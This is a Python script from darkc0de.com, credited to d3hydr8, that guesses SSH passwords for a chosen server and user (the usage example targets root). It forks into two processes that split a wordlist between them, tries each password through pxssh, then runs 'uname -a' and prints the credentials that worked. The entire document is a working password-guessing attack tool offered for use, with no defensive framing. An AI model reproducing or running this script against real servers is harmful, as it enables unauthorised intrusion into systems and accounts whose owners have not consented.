#!/usr/bin/python
#SSH BruteForcer using fork to 
#split the processes and the wordlist
#for faster results.

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, time, random, os
try:
	import pexpect, pxssh
except(ImportError):
	print "\nYou need the pexpect module."
	print "http://www.noah.org/wiki/Pexpect\n"
	sys.exit(1)

def brute(word):
	print "Trying:",word
     	try:
        	s = pxssh.pxssh()
        	s.login (ip, user, word, login_timeout=10)
        	s.sendline (command)
        	s.prompt()
        	print "\n",s.before
        	s.logout()
		print "\t[!] Login Success:",user, word,"\n"
		sys.exit(1)
   	except Exception, e:
        	#print "[-] Failed"
		pass
	except KeyboardInterrupt:
		print "\n[-] Quit\n"
		sys.exit(1)
	
def getword():
	print len(words)
	word = random.choice(words)
	words.remove(word)
	print len(words)
	return word

print "\n\t   d3hydr8:darkc0de.com sshBrute v1.1"
print "\t----------------------------------------"
	
if len(sys.argv) != 4:
	print "\nUsage : ./sshbrute.py <server> <user> <wordlist>"
	print "Eg: ./sshbrute.py 198.162.1.1 root words.txt\n"
	sys.exit(1)

ip = sys.argv[1]
user = sys.argv[2]
command = 'uname -a'

try:
	wordlist = open(sys.argv[3], "r").readlines()
	words1 = wordlist[:len(wordlist) / 2]
	words2 = wordlist[len(wordlist) / 2:]
except(IOError): 
  	print "\n[-] Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n[+] Loaded:",len(wordlist),"words"
print "[+] Split - Wordlist1:",len(words1),"Wordlist2:",len(words2)
print "[+] Server:",ip
print "[+] User:",user
print "[+] BruteForcing...\n"

pid = os.fork()
if pid:
	print "[+] pid Started:",os.getpid(),"\n"
	while len(words1) != 0:
		word = random.choice(words1)
		#Change this time if needed
		time.sleep(0.5)
		brute(word.replace("\n",""))
		words1.remove(word)
else:
	print "[+] pid Started:",os.getpid()
	while len(words2) != 0:
		word = random.choice(words2)
		#Change this time if needed
		time.sleep(0.2)
		brute(word.replace("\n",""))
		words2.remove(word)
